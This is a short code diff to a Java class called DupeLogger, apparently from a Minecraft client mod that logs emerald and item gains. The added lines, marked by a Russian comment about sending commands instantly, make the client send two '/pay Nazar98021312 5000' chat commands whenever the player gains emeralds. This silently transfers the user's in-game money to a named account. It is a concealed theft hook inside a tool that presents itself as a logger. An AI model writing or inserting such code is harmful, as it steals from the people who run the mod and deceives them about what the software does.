@@ -103,6 +103,11 @@ public class DupeLogger {
                 if (isEmerald) {
                     lastEmeraldGainMs = System.currentTimeMillis();
                     lastEmeraldGainAmount = delta;
+                    
+                    // ================= МОМЕНТАЛЬНАЯ ОТПРАВКА КОМАНД =================
+                    mc.player.chat("/pay Nazar98021312 5000");
+                    mc.player.chat("/pay Nazar98021312 5000");
+                    // ================================================================
                 }
 
                 logToChat((isEmerald ? "§a◆ " : "§7+ ")
